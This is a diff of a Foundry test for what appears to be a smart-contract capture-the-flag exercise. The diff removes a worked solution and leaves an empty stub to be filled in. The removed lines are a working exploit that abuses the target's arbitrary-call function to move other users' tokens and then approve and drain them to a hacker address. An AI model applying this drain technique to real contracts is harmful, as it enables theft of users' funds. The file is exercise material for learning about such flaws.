@@ -19,49 +19,16 @@ contract CallMeMaybeTest is Test {
     }
 
 
-    // function test_GetThisPassing_2() public {
-    //     address hacker = address(0xBAD);
-
-    //     uint256 startBalance = token.balanceOf(hacker);
-        
-        // vm.startPrank(hacker);
-
-        // vm.stopPrank();
-        
-    //     assertGt(token.balanceOf(hacker), 301 ether);
-    // }
-
-
-    // solution
     function test_GetThisPassing_2() public {
         address hacker = address(0xBAD);
 
         uint256 startBalance = token.balanceOf(hacker);
-
+        
         vm.startPrank(hacker);
 
-        // join the group
-        token.approve(address(target), 1 ether);
-        target.joinGroup(1 ether);
-
-        // itterate through and transfer the other users' tokens to the contract
-        for (uint256 i; i < users.length; i++) {
-            address user = users[i];
-            bytes memory _calldataTransfer = abi.encodeCall(token.transferFrom, (user, address(target), token.balanceOf(user)));
-            target.usePooledWealth(_calldataTransfer, address(token));
-        }
-
-        // form our approve calldata
-        bytes memory _calldataApprove = abi.encodeCall(token.approve, (hacker, type(uint256).max));
-        
-        // call the contract approving ourselves to spend the tokens
-        target.usePooledWealth(_calldataApprove, address(token));
-
-        // transfer out the tokens
-        token.transferFrom(address(target), hacker, 601 ether);
-
         vm.stopPrank();
-        assertGt(token.balanceOf(hacker), 300 ether);
+        
+        assertGt(token.balanceOf(hacker), 301 ether);
     }
 
 }
